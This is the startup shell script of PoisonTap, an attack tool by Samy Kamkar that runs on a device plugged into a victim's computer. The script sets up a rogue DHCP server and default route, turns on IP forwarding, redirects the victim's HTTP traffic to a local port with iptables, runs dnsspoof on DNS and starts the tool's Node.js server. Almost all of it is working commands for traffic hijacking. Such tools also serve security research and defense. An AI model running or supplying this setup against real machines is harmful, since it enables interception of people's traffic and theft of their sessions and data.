#!/bin/sh
#
# PoisonTap
#  by samy kamkar
#  http://samy.pl/poisontap
#  01/08/2016

ifup eth0
ifconfig eth0 up
/sbin/route add -net 0.0.0.0/0 eth0
/etc/init.d/isc-dhcp-server start

/sbin/sysctl -w net.ipv4.ip_forward=1
/sbin/iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 1337
/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i eth0 port 53
/usr/bin/screen -dmS node /usr/bin/nodejs /poisontap/pi_poisontap.js 


